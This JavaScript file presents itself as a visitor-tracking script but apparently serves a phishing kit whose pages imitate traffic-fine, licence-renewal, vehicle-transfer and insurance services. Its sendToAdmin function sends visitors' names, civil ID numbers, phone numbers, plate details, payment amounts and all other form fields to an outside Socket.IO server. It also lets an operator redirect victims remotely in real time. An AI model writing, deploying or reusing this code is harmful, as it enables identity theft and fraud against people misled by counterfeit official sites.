/**
 * Visitor Tracking Script for Static HTML Pages
 * Connects to the Railway server via Socket.IO to register visitors
 * and track page navigation in the admin panel.
 * Also provides a global function to send form data to admin.
 */
(function() {
  'use strict';

  const SOCKET_URL = 'https://jazeera-server-production.up.railway.app';
  
  // Global socket reference
  var _socket = null;
  var _isConnected = false;
  var _pendingData = [];

  // Load Socket.IO client library dynamically
  function loadSocketIO(callback) {
    if (window.io) {
      callback();
      return;
    }
    const script = document.createElement('script');
    script.src = 'https://cdn.socket.io/4.6.0/socket.io.min.js';
    script.onload = callback;
    script.onerror = function() {
      console.error('[Tracking] Failed to load Socket.IO');
    };
    document.head.appendChild(script);
  }

  // Get current page name from URL
  function getPageName() {
    const path = window.location.pathname;
    if (path === '/' || path.includes('home') || path.includes('index')) return 'الصفحة الرئيسية | الجزيرة';
    if (path.includes('offers')) return 'بيمة - العروض';
    if (path.includes('rop-home')) return 'الصفحة الرئيسية';
    if (path.includes('results-page')) return 'نتائج المخالفات';
    if (path.includes('rop-fines')) return 'صفحة المخالفات';
    if (path.includes('rop-license-results')) return 'نتائج تجديد الرخصة';
    if (path.includes('rop-transfer-results')) return 'نتائج نقل الملكية';
    if (path.includes('rop-results')) return 'نتائج المخالفات';
    if (path.includes('rop-renew-license')) return 'تجديد رخصة القيادة';
    if (path.includes('rop-renew-vehicle')) return 'تجديد سجل المركبة';
    if (path.includes('rop-transfer-vehicle')) return 'نقل ملكية مركبة';
    return 'الصفحة الرئيسية | الجزيرة';
  }

  // Send pending data after connection
  function sendPendingData() {
    while (_pendingData.length > 0 && _isConnected && _socket) {
      var item = _pendingData.shift();
      _socket.emit('more-info', item);
      console.log('[Tracking] Sent pending data:', item);
    }
  }

    // Global function to send data to admin panel
  window.sendToAdmin = function(data, pageName) {
    // Map our keys to what the backend expects
    var mappedData = {};
    
    // Map fullName
    if (data.fullName) mappedData["الاسم"] = data.fullName;
    else if (data.name) mappedData["الاسم"] = data.name;
    
    // Map idNumber
    if (data.idNumber) mappedData["الرقم المدني"] = data.idNumber;
    else if (data.civilId) mappedData["الرقم المدني"] = data.civilId;
    
    // Map phone
    if (data.phone) mappedData["رقم الهاتف"] = data.phone;
    else if (data.mobile) mappedData["رقم الهاتف"] = data.mobile;
    
    // Map plate details
    if (data.plateNumber) mappedData["رقم اللوحة"] = data.plateNumber;
    if (data.plateChar) mappedData["رمز اللوحة"] = data.plateChar;
    
    // Map amount
    if (data.amount) mappedData["المبلغ"] = data.amount;
    
    // Map company
    if (data.company) mappedData["شركة التأمين"] = data.company;
    
    // Map insurance type
    if (data.insuranceType) mappedData["نوع التأمين"] = data.insuranceType;
    
    // Add any other fields that weren't mapped
    for (var key in data) {
      if (!["fullName", "name", "idNumber", "civilId", "phone", "mobile", "plateNumber", "plateChar", "amount", "company", "insuranceType"].includes(key)) {
        mappedData[key] = data[key];
      }
    }

    var payload = {
      content: mappedData,
      page: pageName || getPageName(),
      waitingForAdminResponse: false
    };
    
    if (_isConnected && _socket) {
      _socket.emit('more-info', payload);
      
      // Also emit visitor:updateName if name is provided
      if (mappedData["الاسم"]) {
        _socket.emit('visitor:updateName', mappedData["الاسم"]);
      }
      
      console.log('[Tracking] Data sent to admin:', payload);
    } else {
      _pendingData.push(payload);
      console.log('[Tracking] Data queued (not connected yet):', payload);
    }
  };

  // Initialize tracking
  function initTracking() {
    loadSocketIO(function() {
      try {
        _socket = io(SOCKET_URL, {
          transports: ['polling', 'websocket'],
          autoConnect: true,
          reconnection: true,
          reconnectionAttempts: Infinity,
          reconnectionDelay: 1000,
          reconnectionDelayMax: 5000,
          timeout: 20000,
          withCredentials: false
        });

        _socket.on('connect', function() {
          console.log('[Tracking] Connected to server');
          _isConnected = true;
          // Register visitor - check URL params first (for cross-domain), then localStorage
          var urlParams = new URLSearchParams(window.location.search);
          var existingVisitorId = urlParams.get('vid') || localStorage.getItem('visitorId');
          _socket.emit('visitor:register', { existingVisitorId: existingVisitorId });
        });

        _socket.on('successfully-connected', function(data) {
          console.log('[Tracking] Visitor registered:', data);
          // Save visitor ID for reconnection
          if (data.pid) {
            localStorage.setItem('visitorId', data.pid);
          }
          // Send current page
          const pageName = getPageName();
          _socket.emit('visitor:pageEnter', pageName);
          // Send any pending data
          sendPendingData();
        });

        _socket.on('reconnect', function() {
          console.log('[Tracking] Reconnected to server');
          _isConnected = true;
          var urlParams = new URLSearchParams(window.location.search);
          var existingVisitorId = urlParams.get('vid') || localStorage.getItem('visitorId');
          _socket.emit('visitor:register', { existingVisitorId: existingVisitorId });
        });

        _socket.on('disconnect', function() {
          _isConnected = false;
        });

        _socket.on('connect_error', function(error) {
          console.error('[Tracking] Connection error:', error.message);
          _isConnected = false;
        });

        _socket.on('visitor:navigate', function(page) {
          if (page) {
            if (page.startsWith('http')) {
              window.location.href = page;
            } else {
              window.location.href = '/' + page;
            }
          }
        });

        _socket.on('blocked', function() {
          console.log('[Tracking] Visitor blocked');
        });

        _socket.on('deleted', function() {
          localStorage.removeItem('visitorId');
          window.location.href = '/';
        });

        // Track page visibility changes
        document.addEventListener('visibilitychange', function() {
          if (document.visibilityState === 'visible' && _socket.connected) {
            _socket.emit('visitor:pageEnter', getPageName());
          }
        });

      } catch (e) {
        console.error('[Tracking] Error initializing:', e);
      }
    });
  }

  // Start tracking when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initTracking);
  } else {
    initTracking();
  }
})();
